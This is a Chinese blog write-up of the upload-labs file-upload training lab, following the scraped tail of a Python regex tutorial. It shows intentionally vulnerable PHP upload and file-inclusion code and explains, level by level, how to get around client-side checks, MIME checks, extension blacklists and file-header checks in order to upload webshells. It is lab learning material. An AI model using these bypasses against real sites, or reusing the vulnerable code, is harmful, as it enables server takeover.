phoneNumRegex.search(msg)mo_2 = phoneNumRegex.findall(msg) # findall方法返回一个列表，里面存储所有的正则匹配数据print(mo_1.group())print(mo_2[0]) 12search: 415-555-4242findall: [&#x27;415-555-4242&#x27;, &#x27;111-222-3333&#x27;] example_2 1234567# 用括号分组phoneNumRegex = re.compile(r&#x27;(\\d\\d\\d)-(\\d\\d\\d-\\d\\d\\d\\d)&#x27;) # 加括号会返回一个元祖mo_1 = phoneNumRegex.search(msg) # 将正则匹配到的数据用括号给定的范围分组，打包成元祖mo_2 = phoneNumRegex.findall(msg) # findall将所有打包好的元祖存放到列表中print(&#x27;mo_1 -&gt; group(0): &#x27;,mo_1.group(0))print(&#x27;mo_1 -&gt; group(1) and group(2): &#x27;,mo_1.group(1),mo_1.group(2))print(&#x27;mo_2: &#x27;,mo_2) 123mo_1 -&gt; group(0): 415-555-4242mo_1 -&gt; group(1) and group(2): 415 555-4242mo_2: [(&#x27;415&#x27;, &#x27;555-4242&#x27;), (&#x27;111&#x27;, &#x27;222-3333&#x27;)] example_3 123456# 管道符号的使用msg = &#x27;Tina Fey and Batman.&#x27;heroRegex = re.compile(r&#x27;Batman|Tina Fey&#x27;) # |为管道符号，如果使用search方法只匹配到最近的一个，finddown会将可选项全部匹配mo_1 = heroRegex.search(msg)mo_2 = heroRegex.findall(msg)print(&#x27;mo_1.group(): &#x27;,mo_1.group()) 12mo_1.group(): Tina Feymo_2: [&#x27;Tina Fey&#x27;, &#x27;Batman&#x27;] example_4 1234# 管道符号多模式匹配batRegex = re.compile(r&#x27;Bat(man|mobile|copter|bat)&#x27;) # 若前缀相同则后缀部分可以用括号与管道符将其分开，减少输入mo = batRegex.search(&#x27;Batmobile lost a wheel&#x27;)print(&#x27;mo.group&#x27;, mo.group()) 1mo.group(): Batmobile example_5 1234# 问号实现可选匹配batRegex = re.compile(r&#x27;Bat(wo)?man&#x27;) # 简单来说，括号里面的存在匹配时就加上，不存在就忽略括号里面的mo = batRegex.search(&#x27;The Adventures of Batman&#x27;)print(&#x27;output: &#x27;,mo.group()) 1output: Batman example_6 1234# 用*号实现多次匹配batRegex = re.compile(r&#x27;Bat(wo)*man&#x27;) # *号代表缺省mo = batRegex.search(&#x27;The Adventures of Batwowowowowoman&#x27;)print(&#x27;output: &#x27;,mo.group()) 1output: Batwowowowowoman 12## 用+号匹配一次或多次batRegex = re.compile(r&#x27;Bat(wo)+man&#x27;) # +号需要括号中的内容至少出现一次 example_7 12345# 用花括号匹配特定的次数haRegex = re.compile(r&#x27;Ha&#123;3&#125;&#x27;) # 指定三次haRegex = re.compile(r&#x27;Ha&#123;3,5&#125;&#x27;) # 有存在3-5个的都可以haRegex = re.compile(r&#x27;Ha&#123;,5&#125;&#x27;) # 匹配0-5个haRegex = re.compile(r&#x27;Ha&#123;3,&#125;&#x27;) # 匹配3或更多次 example_8 12345678910# example_6 贪心匹配和非贪心匹配 (好像在python3.8版本中被废弃？)## 贪心greedyHaRegex = re.compile(r&#x27;(Ha)&#123;3, 5&#125;?&#x27;)mo1 = greedyHaRegex.search(&#x27;HaHaHaHaHa&#x27;)print(mo1) ## 输出报错## 非贪心notGreedyHaRegex = re.compile(r&#x27;(Ha)&#123;3,5&#125;&#x27;)mo2 = notGreedyHaRegex.search(&#x27;HaHaHaHaHa&#x27;)print(mo2) ## 输出报错 建立字符分类 example_1 123vowelRegex = re.compile(r&#x27;[aeiouAEIOU]&#x27;) # 中括号中就是用户需要匹配的字符mo = vowelRegex.findall(&#x27;RoboCop eats baby food. BABY FOOD.&#x27;)print(&quot;Output: &quot;, mo) 1Output: [&#x27;o&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;a&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;A&#x27;, &#x27;O&#x27;, &#x27;O&#x27;] 123vowelRegex = re.compile(r&#x27;[^aeiouAEIOU]&#x27;) # 如果在前面加上^符号就代表不匹配这些字符mo = vowelRegex.findall(&#x27;RoboCop eats baby food. BABY FOOD.&#x27;)print(&quot;Output: &quot;, mo) 1Output: [&#x27;R&#x27;, &#x27;b&#x27;, &#x27;C&#x27;, &#x27;p&#x27;, &#x27; &#x27;, &#x27;t&#x27;, &#x27;s&#x27;, &#x27; &#x27;, &#x27;b&#x27;, &#x27;b&#x27;, &#x27;y&#x27;, &#x27; &#x27;, &#x27;f&#x27;, &#x27;d&#x27;, &#x27;.&#x27;, &#x27; &#x27;, &#x27;B&#x27;, &#x27;B&#x27;, &#x27;Y&#x27;, &#x27; &#x27;, &#x27;F&#x27;, &#x27;D&#x27;, &#x27;.&#x27;] example_2 1ext..."}],"posts":[{"title":"","slug":"upload-labs","date":"2021-10-17T15:07:21.657Z","updated":"2021-12-31T16:18:03.174Z","comments":true,"path":"1/","link":"","permalink":"http://example.com/1/","excerpt":"","text":"前提知识文件上传知识 php文件上传过程 Less-1(前端禁用JS绕过)前端存在js代码判断文件类型，所以直接浏览器禁用Js 12345678910111213141516171819&lt;script type=&quot;text/javascript&quot;&gt; function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; 然后就可以直接上传一句话，注意upload文件夹在网站根目录。 Less-2（检查文件类型，MIME绕过）后端检测文件类型，使用图片马，抓包时将filename的后缀改为.php 1234567891011121314151617181920// php源码$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;文件类型不正确，请重新上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 造成原因：后端只检测了文件的类型但是并没有检测文件后缀，如果抓包修改了文件后缀文件类型仍是图片类型，所以可以造成文件上传漏洞。 修复方案：在后端添加一个文件后缀检测函数，可以在代码层面避免，但是也会存在服务器解析漏洞不是代码层面能够解决的东西。 Less-3(服务器对陌生后缀名解析)首先直接上传了php文件不出意外的失败了，又尝试图片马抓包修改后缀发现也失败，应该就像之前说的在后端添加了检测文件后缀的代码，但是没有检测文件头，所以不用在文件头添加幻数。 想想之前学的一共有两个思路：一个是利用phtml后缀的文件看看能不能过黑名单，还有一个就是利用服务器解析漏洞，但是这个是有条件的，具体条件忘了慢慢尝试。 能够上传.phtml后缀的文件，但是服务器不能后解析？不知道为什么，抓包的时候发现了这个东西 文件名让人给改了，看这个格式估计是改成了时间戳，再次进入upload目录访问这个文件解析成功了，但是蚁剑连不上，我之后有往里面添加了phpinfo()也没有解析出来，实在是奇怪。尝试用另一种方法，看看有没有服务器解析漏洞。都不行，上网搜了搜，发现是apache的配置文件中没有设置可以解析phtml，php5，php3等文件后缀，需要设置一下。 记录一下，由于docker中的系统是ubuntu的，所以apache的默认安装路径为/etc/apache2，配置文件也不再是httpd.conf而是apache2.conf，然后docker中又不能安装vim，也没有vi????，最后使用命令echo &quot;AddType application/x-httpd-php .php .phtml .phps .php5 .pht&quot; &gt;&gt; apache2.conf，重启container配置成功，php3 php5 phtml后缀文件全部都能解析。 1234567891011121314151617181920212223242526272829//作者源码$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 总结：第三关要学习的即使绕过黑名单，在实际中黑名单永远比白名单好绕过，一个是不能上传哪些，一个是只能上传哪些，当过滤不严格时可以用phtml，php5，php3，pht等后缀文件上传绕过。 Less-4(使用.htaccess绕过黑名单)使用.htaccess后文件来绕过，使他可以将其他后缀的文件解析成php文件，后端源码黑名单中过滤了很多东西。 1AddType application/x-httpd-php .png （把.png文件当做.php文件来解析） 上传上去，然后在上传png后缀的后门 1234567891011121314151617181920212223242526272829# 源码$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传!&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; Less-5(后缀面大小写绕过)禁止了之前关卡所有的绕过方式，看提示和网上教程，使用文件名后缀大小写方式绕过。但是服务器解析不了？？？，后缀不正常的都解析不了，这个配置是怎么配置的。查看github项目，修改了docker-php.conf的一些东西，发现可以了？？，奇怪得很。 但是如果直接在浏览器的url处输入会把所有的输入变成小写，需要用到hackbar，这下可以解析大小写后缀的东西了。 注意如果使用文件后缀大小写绕过最好用hackbar，不要直接输入，会将你的输入全部自动变成小写。 Less-6(Winodws下文件后缀空格绕过)使用空格绕过，源码中少了这个语句，那么就可以使用bp抓包给文件后缀添加空格。 1$file_ext = trim($file_ext); //首尾去空 但是这道题有一个坑，就是我用的是Docker，当文件后缀有空格时在Windows系统下会自动忽略但是Linux不会自动忽略文件末尾的空格，所以就算能够成功上传还是无法解析，最后我发现需要修改一下docker-php.conf文件(如何使用docker命令进入容器shell请自己百度)，用到.htaccess的知识。在文件中添加这样一个语句。这样就可以解析了，问题暂时解决了。 123&lt;FilesMatch \\.php &gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 网上的教程基本都是用phpstudy之类的集成环境在windows下搭建的，如果用docker还是有很多坑的，需要自己慢慢去踩，不过还是可以学到一点服务器的东西hhhhh 12345678910111213141516171819202122232425262728# 还是贴下源码$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; Less-7(文件后缀点号绕过)这次的源码没有去掉后缀的.号，做法和上面的一样，通过抓包修改文件后缀添加一个.就可以成功上传，具体过程就不说了，贴下源码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; Less-8(Windows下::$DATA文件流绕过)这关使用多文件后缀可过，其实之前的几关都可以使用多文件后缀的方式过，但是感觉多文件后缀的方式不好，没有达到作者的意思，通过源码发现这次比之前少了一个检测。 1$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 关于$DATA的知识点：php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA“之前的文件名 他的目的就是不检查后缀名。 那么还是就可以通过抓包修改文件后缀的方式来进行绕过，先尝试尝试，发现可以上传，但是在docker中似乎只是单纯的修改了文件名，并没有任何作用 感觉这个upload-labs有部分环境都只能是在windows下才能生效，如果在Linux下很多解析规则都不一样了。这就没法做了，先跳过，之后在windows的环境下在做做看 Less-9(多点空格绕过)这一关也还是可以通过服务器多重解析来绕过，不重点去讲，之前学文件上传的经验基本用完了，看看源码有哪些操作。 12345$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空 上面的过滤把之前绕过的方法全部过滤了，看网上的做法是使用空格加点来进行绕过，名称叫多点空格绕过。 首先还是要通过bp抓包，然后修改后缀加空格和点。 由于前面加了空格，所以php只会过滤文件后缀最后的点，上传到服务器上面时后缀就变成了.php.\\r，这种后缀的php文件服务器是可以解析的。 1234567891011121314151617181920212223242526272829// 源码$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; Less-10(正则匹配双写绕过)加入了正则匹配，这关如果了解过sql注入就比较简单，代码逻辑就是将黑名单中的后缀名进行正则匹配，如果匹配成功就替换成空。比如我们上传一个php后缀的文件。 上传到服务器后就变成了如下的样子，由于后缀在黑名单中，所以直接被去掉了。 绕过方法也比较简单，直接双写绕过，因为一般代码中的正则匹配只匹配一次，所以双写一次就可以绕过了。 这次上传一个文件后缀为.pphphp的php代码文件，在看看服务器上的文件夹是什么样子。 这样就写入webshell了，比较简单的一关，php的真则匹配还是比较好理解的。 123456789101112131415161718192021# 源码$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; Less-11(%00截断符绕过-GET方式)现在开始白名单时间，之前全都是绕过黑名单，白名单的绕过方法要比黑名单少很多。 学习的知识点是使用%00去截断，这个漏洞有前提 12（1）php版本必须小于5.3.4 （2）打开php的配置文件php-ini，将magic_quotes_gpc设置为Off 但是我docker上的php版本是5.5.38，已经不满足条件了，只有后面在windows环境下复现或者在去折腾docker（不是很愿意） 12345678910111213141516171819202122# 源码$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); //获取文件后缀 if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];//获取文件的复件，将附件重命名。 $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; //将文件重命名为随机文件名 if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125;# 大致逻辑为：将文件复制两份，一份用于获取文件的后缀名，一份用于重命名。 这道题给了我一点做web的启发，就是参数对于用户可控这个问题，无论是post传参数还是get传参数，很多时候这种就是突破口，后面看到参数可控一定要非常注意。 Less-12(%00截断符绕过-POST方式)这道题好像也是使用%00截断符绕过？ 看了看源码，也抓了下包，发现就是把参数save_path的提交方式从get换到了post，方法和上面的都是一样的。。 1234567891011121314151617181920# 源码，和Less-11几乎是一模一样的$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;上传失败&quot;; &#125; &#125; else &#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; Less-13(检查图片文件头)这关有三个要求，要求传三种格式的图片马都能成功解析才算过关 源码分成两个部分，一个是检查文件头，取出文件头的两个字节来进行判断，但是具体逻辑是取出两个字节，使用unpack函数将两个字节转换成两个十进制数的字符串形式，在将两个十进制字符串拼接转为整数。 123456789101112131415161718192021222324# 检测文件头函数function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125; 首先使用010Editor编辑好三种图片马，然后就可以绕过文件头检测。 这里需要控制参数$img_path，如果控制不了即使上传成功后缀名不对服务器也无法解析。 1234567891011121314151617$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;&#125; 这里看了看，好像能修改的只有date(&quot;YmdHis&quot;)这里，但是不知道可不可以修改时间戳，之前看好像浏览器可以修改。也不对，网上看了看别人写的通关Pass，好像需要使用文件包含漏洞，这个我也不会，学web就是遇到什么学什么。 后面发现作者专门写了一个文件包含漏洞来使用上传的图片马（我没看见，眼睛是真的瞎。。），这道题也了解了点关于文件包含的知识，就是不管上传什么文件，include函数都会将那个文件当成php文件来解析，这就比厉害了，就这用有文件包含和文件上传漏洞的网页直接无解 123456789101112&lt;?php /* 本页面存在文件包含漏洞，用于测试图片马是否能正常运行！ */ header(&quot;Content-Type:text/html;charset=utf-8&quot;); $file = $_GET[&#x27;file&#x27;]; if(isset($file))&#123; include $file; &#125;else&#123; show_source(__file__); &#125;?&gt; 这关算是完成了，成功的制作了三种图片马并且成功上传，也了解了文件上传的知识，还是不错的。 Less-14(PHP内置函数绕过&lt;image_type_to_extension&gt;)也是开始审计代码，毕竟什么都不知道（每做一关就吧使用的后门文件保存下来，到时候在写一个工具直接用工具去扫） 审源码，function isImage作用应该是测试文件是否为图片让后返回图片后缀名。 1234567891011121314function isImage($filename)&#123; $types = 